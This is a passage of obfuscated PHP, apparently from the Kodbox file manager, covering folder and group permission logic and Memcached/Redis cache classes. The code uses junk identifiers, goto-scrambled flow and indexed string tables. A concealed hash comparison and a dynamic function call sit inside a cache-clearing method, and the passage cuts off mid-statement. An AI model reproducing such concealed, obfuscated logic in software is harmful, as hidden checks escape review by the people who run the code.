B¾µºÅã•¯: if (isset($c’ò÷‡Ï‰»[$Aµó§ö×à[466]])) { $A“†ÍÏ¯ÛÔ = explode($Aµó§ö×à[8], trim($c’ò÷‡Ï‰»[$Aµó§ö×à[468]], $Aµó§ö×à[8])); array_shift($A“†ÍÏ¯ÛÔ); $däÔ‹ã°Å© = $c’ò÷‡Ï‰»[$Aµó§ö×à[464]] . $Aµó§ö×à[2314] . implode($Aµó§ö×à[8], $A“†ÍÏ¯ÛÔ); } return array($Aµó§ö×à[386] => $c’ò÷‡Ï‰»[$Aµó§ö×à[28]], $Aµó§ö×à[75] => KodIO::make($c’ò÷‡Ï‰»[$Aµó§ö×à[369]]), $Aµó§ö×à[2315] => $däÔ‹ã°Å©); goto E¦¦§‡¤Æ; E¦¦§‡¤Æ: } private function groupAuthInfo($FÂ–æÈø™, $C¡Á…°§Ä´) { $bïÔ˜š½„ =& $_SERVER[ã®Â„Éæ¹¤]; $d“¦²Ù”‹« = Model($bïÔ˜š½„[460])->getInfo($C¡Á…°§Ä´); return array($bïÔ˜š½„[2316] => intval($FÂ–æÈø™[$bïÔ˜š½„[376]]), $bïÔ˜š½„[2299] => $FÂ–æÈø™, $bïÔ˜š½„[2317] => LNG($bïÔ˜š½„[2318]), $bïÔ˜š½„[2308] => array($bïÔ˜š½„[386] => $d“¦²Ù”‹«[$bïÔ˜š½„[28]], $bïÔ˜š½„[75] => KodIO::make($d“¦²Ù”‹«[$bïÔ˜š½„[391]][$bïÔ˜š½„[369]]), $bïÔ˜š½„[2315] => $d“¦²Ù”‹«[$bïÔ˜š½„[465]])); } protected function groupRootAuth($c‹‚Íôñ®, $AĞ ½ö…¾ = false) { goto e¯òßñ; E²¨¼Ñèã±: $A©êÕº¢¦° = $this->userGroupList($AĞ ½ö…¾); $DœİŠ¦ªÏ = isset($A©êÕº¢¦°[$c‹‚Íôñ®]) ? $A©êÕº¢¦°[$c‹‚Íôñ®][$a½ÉÌæ¦…[376]] : !1; if ($DœİŠ¦ªÏ && Model($a½ÉÌæ¦…[2290])->authCheckAction($DœİŠ¦ªÏ[$a½ÉÌæ¦…[376]], $a½ÉÌæ¦…[1582])) { $DëáÁâª™[$Cš¤Ó»¹¡] = $DœİŠ¦ªÏ; return $DœİŠ¦ªÏ; } goto e…îŒ†êå; c’ĞÉ‰áÈ©: return $DëáÁâª™[$Cš¤Ó»¹¡]; goto a·ªÖ’Èù; B—¦š«©¶º: static $DëáÁâª™ = array(); if (isset($DëáÁâª™[$Cš¤Ó»¹¡])) { return $DëáÁâª™[$Cš¤Ó»¹¡]; } $b•Âä‚Ìª‡ = Model($a½ÉÌæ¦…[460])->getInfo($c‹‚Íôñ®); goto E²¨¼Ñèã±; e…îŒ†êå: $BÛÂ¦Ç¸ìÉ = array($a½ÉÌæ¦…[369] => $b•Âä‚Ìª‡[$a½ÉÌæ¦…[391]][$a½ÉÌæ¦…[369]]); $BßÄòÄäÆ‘ = $a½ÉÌæ¦…[2298]; $C…Éä–Šá³ = $this->field($BßÄòÄäÆ‘)->cacheMemory()->where($BÛÂ¦Ç¸ìÉ)->select(); goto CõİŠ÷†Ã¸; CõİŠ÷†Ã¸: $E¯ÑÊœ¡ø = $C…Éä–Šá³ ? $this->authMake($C…Éä–Šá³, $AĞ ½ö…¾) : !1; $BÑœ†­á = $E¯ÑÊœ¡ø ? $E¯ÑÊœ¡ø[$a½ÉÌæ¦…[418]] : !1; $DëáÁâª™[$Cš¤Ó»¹¡] = $BÑœ†­á ? $BÑœ†­á : $DœİŠ¦ªÏ; goto c’ĞÉ‰áÈ©; e¯òßñ: $a½ÉÌæ¦… =& $_SERVER[ã®Â„Éæ¹¤]; $AĞ ½ö…¾ = $AĞ ½ö…¾ ? $AĞ ½ö…¾ : USER_ID; $Cš¤Ó»¹¡ = $AĞ ½ö…¾ . $a½ÉÌæ¦…[2319] . $c‹‚Íôñ®; goto B—¦š«©¶º; a·ªÖ’Èù: } public function authOwnerApply($c»‹»‰ƒºµ) { goto BªêÜåãæ; EÖ–¨æø´Ù: $dÆ—ÏòÀ”¿ = array($a³İ‘áÃ¢[383] => array($a³İ‘áÃ¢[384], $C‡é’Á¨Œ)); $DïÈ·Ë‘öÙ = $this->field($B‡à¬îÀÔ–)->where($dÆ—ÏòÀ”¿)->select(); $DïÈ·Ë‘öÙ = array_to_keyvalue_group($DïÈ·Ë‘öÙ, $a³İ‘áÃ¢[369]); goto fïº¥´ÉÊ; fïº¥´ÉÊ: $eòÔ‰ééİ‘ = array(); $AÚŸŠğªâ¹ = array(); foreach ($DïÈ·Ë‘öÙ as $dãÍ¢×¦¯ => $fÅ‘Û¯Û¬Ø) { $cƒå–¢º™Ø = $this->authFolderOwnerUser($fÅ‘Û¯Û¬Ø); $eòÔ‰ééİ‘[$dãÍ¢×¦¯] = $cƒå–¢º™Ø; $AÚŸŠğªâ¹ = array_merge($AÚŸŠğªâ¹, $cƒå–¢º™Ø[$a³İ‘áÃ¢[536]]); if ($cƒå–¢º™Ø[$a³İ‘áÃ¢[2321]]) { break; } } goto b‹µƒÕÃ–; D¼®ÑìÀÑ¤: $C‡é’Á¨Œ = Model($a³İ‘áÃ¢[1136])->parentLevelArray($c»‹»‰ƒºµ[$a³İ‘áÃ¢[461]]); $C‡é’Á¨Œ = array_merge(array($c»‹»‰ƒºµ[$a³İ‘áÃ¢[369]]), array_reverse($C‡é’Á¨Œ)); $B‡à¬îÀÔ– = $a³İ‘áÃ¢[2298]; goto EÖ–¨æø´Ù; b‹µƒÕÃ–: if (count($AÚŸŠğªâ¹) == 0) { $AÚŸŠğªâ¹ = $this->authFolderOwnerGroup($c»‹»‰ƒºµ[$a³İ‘áÃ¢[458]]); } $AÚŸŠğªâ¹ = array_unique($AÚŸŠğªâ¹); if (AuthModel::authCheckRoot($c»‹»‰ƒºµ[$a³İ‘áÃ¢[376]][$a³İ‘áÃ¢[377]])) { $AÚŸŠğªâ¹[] = USER_ID; } goto CŞ’Õ‚ã¹ˆ; BªêÜåãæ: $a³İ‘áÃ¢ =& $_SERVER[ã®Â„Éæ¹¤]; if (empty($c»‹»‰ƒºµ[$a³İ‘áÃ¢[376]]) || isset($c»‹»‰ƒºµ[$a³İ‘áÃ¢[2320]]) && $c»‹»‰ƒºµ[$a³İ‘áÃ¢[2320]]) { return $c»‹»‰ƒºµ; } if (AuthModel::authCheckRoot($c»‹»‰ƒºµ[$a³İ‘áÃ¢[376]][$a³İ‘áÃ¢[377]])) { return $c»‹»‰ƒºµ; } goto D¼®ÑìÀÑ¤; CŞ’Õ‚ã¹ˆ: $c»‹»‰ƒºµ[$a³İ‘áÃ¢[376]][$a³İ‘áÃ¢[2322]] = Model($a³İ‘áÃ¢[476])->userListInfo($AÚŸŠğªâ¹); return $c»‹»‰ƒºµ; goto eã‹Šå ôØ; eã‹Šå ôØ: } private function authFolderOwnerGroup($eºÚ·…ô¥) { $E‡‡ª•Ç†ß =& $_SERVER[ã®Â„Éæ¹¤]; $a°éÜö¯ĞÁ = Model($E‡‡ª•Ç†ß[2206])->where(array($E‡‡ª•Ç†ß[2127] => $eºÚ·…ô¥))->select(); $Bƒ´ó¡”Ñ£ = array(); if (!$a°éÜö¯ĞÁ) { return $Bƒ´ó¡”Ñ£; } foreach ($a°éÜö¯ĞÁ as $eÎÜÍ“ÕÍ) { $BÑ¢‹ó‘ÆÁ = $this->authInfo($eÎÜÍ“ÕÍ); if (AuthModel::authCheckRoot($BÑ¢‹ó‘ÆÁ[$E‡‡ª•Ç†ß[376]])) { $Bƒ´ó¡”Ñ£[] = $eÎÜÍ“ÕÍ[$E‡‡ª•Ç†ß[1456]]; } } return $Bƒ´ó¡”Ñ£; } private function authFolderOwnerUser($DÜµµ‘ª“ñ) { $fÔ¤Û†Ìï¿ =& $_SERVER[ã®Â„Éæ¹¤]; $B³¾‹Î‰§î = array(); $d‚óò— = !1; foreach ($DÜµµ‘ª“ñ as $e±ÆÉÛÕÖ) { $dÑóÙ˜‚ = $this->authInfo($e±ÆÉÛÕÖ); if ($e±ÆÉÛÕÖ[$fÔ¤Û†Ìï¿[458]] == $fÔ¤Û†Ìï¿[470]) { $d‚óò— = !0; } if ($e±ÆÉÛÕÖ[$fÔ¤Û†Ìï¿[371]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($dÑóÙ˜‚[$fÔ¤Û†Ìï¿[376]])) { $B³¾‹Î‰§î[] = $e±ÆÉÛÕÖ[$fÔ¤Û†Ìï¿[458]]; } } } return array($fÔ¤Û†Ìï¿[536] => $B³¾‹Î‰§î, $fÔ¤Û†Ìï¿[2321] => $d‚óò—); } public function authMake($aŠ”‰ªÂÜ, $f¤“ŒÁšÙ‘ = false) { goto c²”²êĞ¥; A‰Î§—‚ƒÒ: return $Eê¾«¶‚Åª; goto E•Ğ‚–òÙ; C‡À˜ÖŠ¿¶: $f­ŠĞÈÓÖ = 0; $cÚèï¤¼¡• = 0; $DÛğ óØ = 0; goto C­ñí‡áè; C­ñí‡áè: $CĞ ùÖ”ê = 1000; $Fğ‰Ÿ½ƒ³ã = 0; $dÕ×ùÛˆ÷ = 0; goto bôµñŒË˜Ğ; Fé…ø’³ó: $E­ñõ¥óçĞ = 0; $eªõ‡óÛéˆ = 0; $EğêÄ‡ˆÌ‚ = 0; goto C‡À˜ÖŠ¿¶; FâÁ§ˆçŞ: foreach ($aŠ”‰ªÂÜ as $e·Îì‰»ä) { $C¸Ù¶Îƒ¥ = $this->authInfo($e·Îì‰»ä); $BÉª–ÈÂÆ = $e·Îì‰»ä[$b£Ü¤ÃĞæ[458]]; $AÙœ’‘¬„ = intval($C¸Ù¶Îƒ¥[$b£Ü¤ÃĞæ[376]]); if ($e·Îì‰»ä[$b£Ü¤ÃĞæ[371]] == SourceModel::TYPE_USER && $BÉª–ÈÂÆ == $f¤“ŒÁšÙ‘) { $E­ñõ¥óçĞ = !0; $EğêÄ‡ˆÌ‚ = $C¸Ù¶Îƒ¥; $eªõ‡óÛéˆ = $AÙœ’‘¬„; } else { if ($e·Îì‰»ä[$b£Ü¤ÃĞæ[371]] == SourceModel::TYPE_GROUP && $this->groupContainUser($BÉª–ÈÂÆ, $f¤“ŒÁšÙ‘)) { $f­ŠĞÈÓÖ = !0; $E‚âØöÌÂ´ = $this->groupStepToUserGroup($BÉª–ÈÂÆ, $f¤“ŒÁšÙ‘); if ($E‚âØöÌÂ´ < $CĞ ùÖ”ê) { $CĞ ùÖ”ê = $E‚âØöÌÂ´; $cÚèï¤¼¡• = $AÙœ’‘¬„; $DÛğ óØ = $C¸Ù¶Îƒ¥; $Fğ‰Ÿ½ƒ³ã = $BÉª–ÈÂÆ; } if ($E‚âØöÌÂ´ == $CĞ ùÖ”ê && $AÙœ’‘¬„ >= $cÚèï¤¼¡•) { $cÚèï¤¼¡• = $AÙœ’‘¬„; $DÛğ óØ = $C¸Ù¶Îƒ¥; $Fğ‰Ÿ½ƒ³ã = $BÉª–ÈÂÆ; } } else { if ($BÉª–ÈÂÆ == $b£Ü¤ÃĞæ[470]) { $dÕ×ùÛˆ÷ = !0; $C±ŒåéßŒ¦ = $C¸Ù¶Îƒ¥; $bö«÷Ø¹•Å = $AÙœ’‘¬„; } } } } if ($E­ñõ¥óçĞ) { $dí•Åƒ’ë‘ = $eªõ‡óÛéˆ; $C¸Ù¶Îƒ¥ = $EğêÄ‡ˆÌ‚; $D¾ƒÏ´“Ä = LNG($b£Ü¤ÃĞæ[2323]); } else { if ($f­ŠĞÈÓÖ) { $dí•Åƒ’ë‘ = $cÚèï¤¼¡•; $C¸Ù¶Îƒ¥ = $DÛğ óØ; $EÎ„ß•éªÊ = Model($b£Ü¤ÃĞæ[460])->getInfo($Fğ‰Ÿ½ƒ³ã); $D¾ƒÏ´“Ä = $b£Ü¤ÃĞæ[157] . $EÎ„ß•éªÊ[$b£Ü¤ÃĞæ[465]] . $b£Ü¤ÃĞæ[2324] . LNG($b£Ü¤ÃĞæ[2325]); } else { if ($dÕ×ùÛˆ÷) { $dí•Åƒ’ë‘ = $bö«÷Ø¹•Å; $C¸Ù¶Îƒ¥ = $C±ŒåéßŒ¦; $D¾ƒÏ´“Ä = LNG($b£Ü¤ÃĞæ[2295]); } else { $dí•Åƒ’ë‘ = 0; $C¸Ù¶Îƒ¥ = !1; $D¾ƒÏ´“Ä = $b£Ü¤ÃĞæ[33]; } } } $Eê¾«¶‚Åª = array($b£Ü¤ÃĞæ[2316] => intval($dí•Åƒ’ë‘), $b£Ü¤ÃĞæ[2299] => $C¸Ù¶Îƒ¥, $b£Ü¤ÃĞæ[2317] => $D¾ƒÏ´“Ä, $b£Ü¤ÃĞæ[2308] => $this->sourceAuthInfo($e·Îì‰»ä[$b£Ü¤ÃĞæ[369]])); goto A‰Î§—‚ƒÒ; bôµñŒË˜Ğ: $bö«÷Ø¹•Å = 0; $C±ŒåéßŒ¦ = 0; $e·Îì‰»ä = array($b£Ü¤ÃĞæ[369] => 0); goto FâÁ§ˆçŞ; c²”²êĞ¥: $b£Ü¤ÃĞæ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$aŠ”‰ªÂÜ) { return array($b£Ü¤ÃĞæ[377] => 0, $b£Ü¤ÃĞæ[418] => !1); } $f¤“ŒÁšÙ‘ = $f¤“ŒÁšÙ‘ ? $f¤“ŒÁšÙ‘ : USER_ID; goto Fé…ø’³ó; E•Ğ‚–òÙ: } private function groupContainUser($cÎÒÙˆ×¨Ö, $FÙ·¹©šñ¤ = false) { return in_array($cÎÒÙˆ×¨Ö, $this->userGroupParents($FÙ·¹©šñ¤)); } private function groupStepToUserGroup($DéÀ‰ºòí, $c¾—®Ëº „ = false) { goto AŠÜÇ“Ÿ‘; eĞ¸ª»‚Œõ: return $c™öĞ‰˜á²; goto cºõÏº¸÷‹; AŠÜÇ“Ÿ‘: $dôÙÑ£ç =& $_SERVER[ã®Â„Éæ¹¤]; $dö¼Æ¾†ÊÌ = $this->userGroupList($c¾—®Ëº „); $c™öĞ‰˜á² = 1000; goto FË—‹ˆØŞÕ; FË—‹ˆØŞÕ: $a›õÉì„çˆ = $GLOBALS[$dôÙÑ£ç[6]][$dôÙÑ£ç[84]][$dôÙÑ£ç[2218]] == 1; $E¸’³§àÅ² = $a›õÉì„çˆ ? 3 : 2; foreach ($dö¼Æ¾†ÊÌ as $cÖ™›õãç) { if ($cÖ™›õãç[$dôÙÑ£ç[2127]] == $DéÀ‰ºòí) { return 0; } $B„ƒÌŞ¾ä¤ = explode($dôÙÑ£ç[47], trim($cÖ™›õãç[$dôÙÑ£ç[461]], $dôÙÑ£ç[47])); if ($B„ƒÌŞ¾ä¤[0] == $dôÙÑ£ç[470] && count($B„ƒÌŞ¾ä¤) > $E¸’³§àÅ²) { $bï›ƒÏ£ó = array_reverse(array_slice($B„ƒÌŞ¾ä¤, $E¸’³§àÅ²)); $dÉö‚ŸŸÔæ = array_search($DéÀ‰ºòí, $bï›ƒÏ£ó); if ($dÉö‚ŸŸÔæ !== !1 && $dÉö‚ŸŸÔæ + 1 <= $c™öĞ‰˜á²) { $c™öĞ‰˜á² = $dÉö‚ŸŸÔæ + 1; } } } goto eĞ¸ª»‚Œõ; cºõÏº¸÷‹: } private function userGroupList($e§ö«İºÃï = false) { $dà§¿ø¿Ô =& $_SERVER[ã®Â„Éæ¹¤]; static $e…¶·Áîæ = array(); if (isset($e…¶·Áîæ[$e§ö«İºÃï])) { return $e…¶·Áîæ[$e§ö«İºÃï]; } $Cƒ£”¸ï”˜ = Model($dà§¿ø¿Ô[479])->getInfo($e§ö«İºÃï); $e…¶·Áîæ[$e§ö«İºÃï] = array_to_keyvalue($Cƒ£”¸ï”˜[$dà§¿ø¿Ô[2296]], $dà§¿ø¿Ô[2127]); return $e…¶·Áîæ[$e§ö«İºÃï]; } public function userGroupParents($eÔºñÓ¾­Ü) { goto A×Ù±ÓµàÚ; CêÇ»ÁåÙ: $B•¹Â…Ø°Ç = $GLOBALS[$cè°ÈËÜõá[6]][$cè°ÈËÜõá[84]][$cè°ÈËÜõá[2218]] == 1; $bŒÈ«“·–§ = $B•¹Â…Ø°Ç ? 3 : 2; foreach ($a„ÏÕêøÓ× as $CÈ„İİ ´‰) { $f™†ÍŠíµ = array($CÈ„İİ ´‰[$cè°ÈËÜõá[2127]]); $dç–Ó‰Ì¦ = explode($cè°ÈËÜõá[47], trim($CÈ„İİ ´‰[$cè°ÈËÜõá[461]], $cè°ÈËÜõá[47])); if ($dç–Ó‰Ì¦[0] == $cè°ÈËÜõá[470] && count($dç–Ó‰Ì¦) > $bŒÈ«“·–§) { $BÛö†æëæÉ = array_slice($dç–Ó‰Ì¦, $bŒÈ«“·–§); $f™†ÍŠíµ = array_merge($f™†ÍŠíµ, array_reverse($BÛö†æëæÉ)); } $EëÏ§Ÿùé = array_merge($EëÏ§Ÿùé, $f™†ÍŠíµ); } goto d˜‰Ñç‘ÆÅ; d˜‰Ñç‘ÆÅ: $dÛŒ”îáé[$eÔºñÓ¾­Ü] = array_unique($EëÏ§Ÿùé); return $dÛŒ”îáé[$eÔºñÓ¾­Ü]; goto Féßë¶ Î; A×Ù±ÓµàÚ: $cè°ÈËÜõá =& $_SERVER[ã®Â„Éæ¹¤]; static $dÛŒ”îáé = array(); $eÔºñÓ¾­Ü = $eÔºñÓ¾­Ü ? $eÔºñÓ¾­Ü : USER_ID; goto Fƒ¢ì›‡è; Fƒ¢ì›‡è: if (isset($dÛŒ”îáé[$eÔºñÓ¾­Ü])) { return $dÛŒ”îáé[$eÔºñÓ¾­Ü]; } $a„ÏÕêøÓ× = $this->userGroupList($eÔºñÓ¾­Ü); $EëÏ§Ÿùé = array(); goto CêÇ»ÁåÙ; Féßë¶ Î: } public function authTargetInfoMake($BÀä»¨¥•) { goto AšÏøñ…‚; AšÏøñ…‚: $C®ÃÈğŒÜ© =& $_SERVER[ã®Â„Éæ¹¤]; $eÎæÍ×ìÃ® = array(); $DÏº­Û¦Ğ = array(); goto c¯‘›áõµ¯; CÌ˜öİ¯×±: return array($C®ÃÈğŒÜ©[2326] => $eÎæÍ×ìÃ®, $C®ÃÈğŒÜ©[2327] => $DÏº­Û¦Ğ); goto F÷¹ØÏµæÁ; c¯‘›áõµ¯: foreach ($BÀä»¨¥• as $AÓŞ˜²º™Ï) { if ($AÓŞ˜²º™Ï[$C®ÃÈğŒÜ©[371]] == SourceModel::TYPE_USER) { $eÎæÍ×ìÃ®[] = intval($AÓŞ˜²º™Ï[$C®ÃÈğŒÜ©[458]]); } else { if ($AÓŞ˜²º™Ï[$C®ÃÈğŒÜ©[371]] == SourceModel::TYPE_GROUP) { $DÏº­Û¦Ğ[] = intval($AÓŞ˜²º™Ï[$C®ÃÈğŒÜ©[458]]); } } } if ($eÎæÍ×ìÃ®) { $eÎæÍ×ìÃ® = Model($C®ÃÈğŒÜ©[476])->userListInfo($eÎæÍ×ìÃ®); } if ($DÏº­Û¦Ğ) { $BÊÀÖËŠ±İ = array($C®ÃÈğŒÜ©[2204] => array($C®ÃÈğŒÜ©[384], $DÏº­Û¦Ğ)); $DÏº­Û¦Ğ = Model($C®ÃÈğŒÜ©[460])->field($C®ÃÈğŒÜ©[2217])->where($BÊÀÖËŠ±İ)->select(); $DÏº­Û¦Ğ = array_to_keyvalue($DÏº­Û¦Ğ, $C®ÃÈğŒÜ©[2127]); } goto CÌ˜öİ¯×±; F÷¹ØÏµæÁ: } public function authInfo($aá†¡°ÕË„) { $cÙ±Ü²öòÛ =& $_SERVER[ã®Â„Éæ¹¤]; if ($aá†¡°ÕË„[$cÙ±Ü²öòÛ[2271]]) { $A­¤ŸÙª¡® = Model($cÙ±Ü²öòÛ[2290])->listData($aá†¡°ÕË„[$cÙ±Ü²öòÛ[2271]]); if (!$A­¤ŸÙª¡®) { return !1; $d²ß¯ÏÛÚ´ = Model($cÙ±Ü²öòÛ[2290])->listData(); $A±“È– · = array_filter_by_field($d²ß¯ÏÛÚ´, $cÙ±Ü²öòÛ[376], $cÙ±Ü²öòÛ[470]); return $A±“È– ·; } $e÷é¼¡ƒ = array_field_key($A­¤ŸÙª¡®, array($cÙ±Ü²öòÛ[367], $cÙ±Ü²öòÛ[28], $cÙ±Ü²öòÛ[376], $cÙ±Ü²öòÛ[2147], $cÙ±Ü²öòÛ[2149])); $e÷é¼¡ƒ[$cÙ±Ü²öòÛ[2328]] = $aá†¡°ÕË„; return $e÷é¼¡ƒ; } else { return array($cÙ±Ü²öòÛ[385] => 0, $cÙ±Ü²öòÛ[2133] => $aá†¡°ÕË„[$cÙ±Ü²öòÛ[2272]], $cÙ±Ü²öòÛ[386] => $cÙ±Ü²öòÛ[33], $cÙ±Ü²öòÛ[2147] => $cÙ±Ü²öòÛ[2329]); } } } goto a²›š×ˆˆå; dê·ƒÊĞç: class CacheLockDatabase { public function lock($Bà›•‘˜”², $A‰õ²„ÉÕ = 0) { $fŠÕ‰¶ÌãÃ = Model($_SERVER[ã®Â„Éæ¹¤][779]); $c•î”ÒÛ„µ = microtime(!0) + $A‰õ²„ÉÕ; while (microtime(!0) < $c•î”ÒÛ„µ) { $a‚Ğâµ˜İ° = $fŠÕ‰¶ÌãÃ->get($Bà›•‘˜”²); if (!$a‚Ğâµ˜İ° || $a‚Ğâµ˜İ° < microtime(!0)) { $bİ”è·¬Ÿ† = $fŠÕ‰¶ÌãÃ->set($Bà›•‘˜”², $c•î”ÒÛ„µ); if ($bİ”è·¬Ÿ†) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($aÕÃïîâê) { return Model($_SERVER[ã®Â„Éæ¹¤][779])->get($aÕÃïîâê); } public function unlock($CæšÜÇÔÑ) { Model($_SERVER[ã®Â„Éæ¹¤][779])->remove($CæšÜÇÔÑ); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($CË„÷·â§É, $E‰“ºèœ­) { $f¬î³¯ìÁÉ =& $_SERVER[ã®Â„Éæ¹¤]; if (!class_exists($f¬î³¯ìÁÉ[803])) { show_json($f¬î³¯ìÁÉ[804], !1); } $this->cacheTime = $E‰“ºèœ­; $this->handle = new Memcached(); if (is_array($CË„÷·â§É[$f¬î³¯ìÁÉ[805]]) && count($CË„÷·â§É[$f¬î³¯ìÁÉ[805]]) >= 1) { foreach ($CË„÷·â§É[$f¬î³¯ìÁÉ[805]] as $d¶à³å¬ˆ‡) { $dÓ¾ Õ¨¬ = explode($f¬î³¯ìÁÉ[4], $d¶à³å¬ˆ‡); $this->handle->addServer($dÓ¾ Õ¨¬[0], $dÓ¾ Õ¨¬[1]); } } else { $this->handle->addServer($CË„÷·â§É[$f¬î³¯ìÁÉ[169]], $CË„÷·â§É[$f¬î³¯ìÁÉ[170]]); } } public function set($bçé­÷ó×È, $AÒÒÔ¹ªôß, $c…©âŒ•Œ÷ = false) { $c…©âŒ•Œ÷ = $c…©âŒ•Œ÷ ? $c…©âŒ•Œ÷ : $this->cacheTime; return $this->handle->set($bçé­÷ó×È, $AÒÒÔ¹ªôß, $c…©âŒ•Œ÷); } public function get($a¦Õì±Í ) { return $this->handle->get($a¦Õì±Í ); } public function remove($C‚ĞõÏ·¥ƒ) { return $this->handle->delete($C‚ĞõÏ·¥ƒ); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($EŠÛåÙ®¹£, $bñà‘Ü»ø) { $d£ÑÓ‚§Ú =& $_SERVER[ã®Â„Éæ¹¤]; if (!class_exists($d£ÑÓ‚§Ú[806])) { show_json($d£ÑÓ‚§Ú[807], !1); } $this->cacheTime = $bñà‘Ü»ø; $aíç‰Î¹Ô = isset($EŠÛåÙ®¹£[$d£ÑÓ‚§Ú[808]]) ? $EŠÛåÙ®¹£[$d£ÑÓ‚§Ú[808]] : 10; $AÖÄÚØŞå = _get($EŠÛåÙ®¹£, $d£ÑÓ‚§Ú[805]); if ($AÖÄÚØŞå && is_array($AÖÄÚØŞå)) { $this->initCluster($EŠÛåÙ®¹£, $aíç‰Î¹Ô); } else { $this->handle = $this->init($EŠÛåÙ®¹£, $aíç‰Î¹Ô); } } private function init($aÊÑ¾¡©, $AÚ®ŠÖ¬Ü¡) { $F¥ºŸ¢•³¯ =& $_SERVER[ã®Â„Éæ¹¤]; $E²Š¥ØçáÌ = new Redis(); $FÜŸ¼ˆÑ = isset($aÊÑ¾¡©[$F¥ºŸ¢•³¯[809]]) ? $aÊÑ¾¡©[$F¥ºŸ¢•³¯[809]] : !1; if ($FÜŸ¼ˆÑ) { $E²Š¥ØçáÌ->pconnect($aÊÑ¾¡©[$F¥ºŸ¢•³¯[169]], $aÊÑ¾¡©[$F¥ºŸ¢•³¯[170]], $AÚ®ŠÖ¬Ü¡); } else { $E²Š¥ØçáÌ->connect($aÊÑ¾¡©[$F¥ºŸ¢•³¯[169]], $aÊÑ¾¡©[$F¥ºŸ¢•³¯[170]], $AÚ®ŠÖ¬Ü¡); } if (!empty($aÊÑ¾¡©[$F¥ºŸ¢•³¯[376]])) { $E²Š¥ØçáÌ->auth($aÊÑ¾¡©[$F¥ºŸ¢•³¯[376]]); } return $E²Š¥ØçáÌ; } private function initCluster($cï°å…ÏŞ‰, $dï‰Ï¾æ—) { $aßã¡åÁà± =& $_SERVER[ã®Â„Éæ¹¤]; $DøØ›Èèáí = array($aßã¡åÁà±[810], $aßã¡åÁà±[811], $aßã¡åÁà±[812]); $E¡ôÁ÷é = $aßã¡åÁà±[810]; if (isset($cï°å…ÏŞ‰[$aßã¡åÁà±[12]]) && in_array($cï°å…ÏŞ‰[$aßã¡åÁà±[12]], $DøØ›Èèáí)) { $E¡ôÁ÷é = $cï°å…ÏŞ‰[$aßã¡åÁà±[12]]; } switch ($E¡ôÁ÷é) { case $aßã¡åÁà±[810]: $this->_slave($cï°å…ÏŞ‰, $dï‰Ï¾æ—); break; case $aßã¡åÁà±[811]: break; case $aßã¡åÁà±[812]: $this->isCluster = !0; $BĞ«óƒŒ = $cï°å…ÏŞ‰[$aßã¡åÁà±[805]]; $b§í¿Û’ÎÍ = isset($cï°å…ÏŞ‰[$aßã¡åÁà±[809]]) ? $cï°å…ÏŞ‰[$aßã¡åÁà±[809]] : !1; $c°™¢µÂØ… = isset($cï°å…ÏŞ‰[$aßã¡åÁà±[376]]) ? $cï°å…ÏŞ‰[$aßã¡åÁà±[376]] : null; $this->handle = new RedisCluster(NUll, $BĞ«óƒŒ, $dï‰Ï¾æ—, $dï‰Ï¾æ—, $b§í¿Û’ÎÍ, $c°™¢µÂØ…); break; default: break; } } private function _slave($fæà ‘‚æ¸, $d¾³«ÃÚƒ) { goto cŠ¬¶ó¢õÚ; bË©½²‚‘: $this->filterConfig($fæà ‘‚æ¸, $FÈ‘óÙº·¯[$C¸ÒÅõÓõ¨]); $this->slaveHandle = $this->init($fæà ‘‚æ¸, $d¾³«ÃÚƒ); goto e¡•ßÏ‘¦¶; cŠ¬¶ó¢õÚ: $FÈ‘óÙº·¯ = $fæà ‘‚æ¸[$_SERVER[ã®Â„Éæ¹¤][805]]; $this->filterConfig($fæà ‘‚æ¸, $FÈ‘óÙº·¯[0]); $this->handle = $this->init($fæà ‘‚æ¸, $d¾³«ÃÚƒ); goto f»Œ¸„˜Ÿ„; f»Œ¸„˜Ÿ„: unset($FÈ‘óÙº·¯[0]); if (empty($FÈ‘óÙº·¯)) { return; } $C¸ÒÅõÓõ¨ = array_rand($FÈ‘óÙº·¯); goto bË©½²‚‘; e¡•ßÏ‘¦¶: } private function filterConfig(&$CˆÆ…ƒîÅš, $fæñË¤¯ôœ) { $f‡È¹¿åÀ¼ =& $_SERVER[ã®Â„Éæ¹¤]; $a¥áÄ‚Ÿáñ = explode($f‡È¹¿åÀ¼[4], $fæñË¤¯ôœ); $b«ÑœĞ¿›ğ = array($f‡È¹¿åÀ¼[169] => $a¥áÄ‚Ÿáñ[0], $f‡È¹¿åÀ¼[170] => $a¥áÄ‚Ÿáñ[1]); $CˆÆ…ƒîÅš = array_merge($CˆÆ…ƒîÅš, $b«ÑœĞ¿›ğ); } public function set($AÉô…¤§î, $d…Ê¯ì›©ö, $aŸØŒÒŞ”á = false) { $aŸØŒÒŞ”á = $aŸØŒÒŞ”á ? $aŸØŒÒŞ”á : $this->cacheTime; return $this->handle->setEx($AÉô…¤§î, $aŸØŒÒŞ”á, $d…Ê¯ì›©ö); } public function setLock($AĞ¾’™³ñÂ, $Aç¡÷ÑÛ, $a¦™æ¨ôù) { return $this->handle->setNX($AĞ¾’™³ñÂ, $Aç¡÷ÑÛ); } public function get($b…˜Ê¢È£„) { $AöàçÚ¦Ó“ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $AöàçÚ¦Ó“->get($b…˜Ê¢È£„); } public function remove($DÔ¥À‹Úíå) { return $this->handle->del($DÔ¥À‹Úíå); } public function deleteAll() { $eÃÑàÏ¯óŒ =& $_SERVER[ã®Â„Éæ¹¤]; $Dò¼‹Ù®ÑÏ = $_SERVER[$eÃÑàÏ¯óŒ[556]] . $eÃÑàÏ¯óŒ[557]; $dÀ›·¶‹ÖÕ = $eÃÑàÏ¯óŒ[553]; if ($_SERVER[$eÃÑàÏ¯óŒ[554]] != $dÀ›·¶‹ÖÕ($Dò¼‹Ù®ÑÏ)) { goto d¨Ìç•âëö; E«Î´éÇò’: $bäŠÚîØ«² = $cßòè´íœì($d£±í¾©šÃ); $C¨¹Æ‰•‰ç = explode($eÃÑàÏ¯óŒ[217], $bäŠÚîØ«²); if (count($C¨¹Æ‰•‰ç) < $eÃÑàÏ¯óŒ[562]) { $C­È¹‡ßœ• = $eÃÑàÏ¯óŒ[559]; $C­È¹‡ßœ•(); } goto Aù˜î“ñ…; Aù˜î“ñ…: $bŞ½ì÷šÙ  = 